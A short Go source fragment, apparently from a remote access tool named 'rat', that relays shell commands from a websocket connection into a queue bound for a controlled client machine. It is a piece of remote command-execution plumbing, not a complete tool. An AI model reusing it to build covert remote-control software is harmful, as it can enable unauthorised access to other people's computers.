package main

import (
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type ShellMessage struct {
	Action  int    `json:"action"`
	Command string `json:"command"`
}

func (m ShellMessage) Handle(ws *websocket.Conn, client *Client) error {
	client.Listeners[header.ShellHeader] = ws
	client.Queue <- &ShellPacket{m.Action, m.Command}

	return nil
}
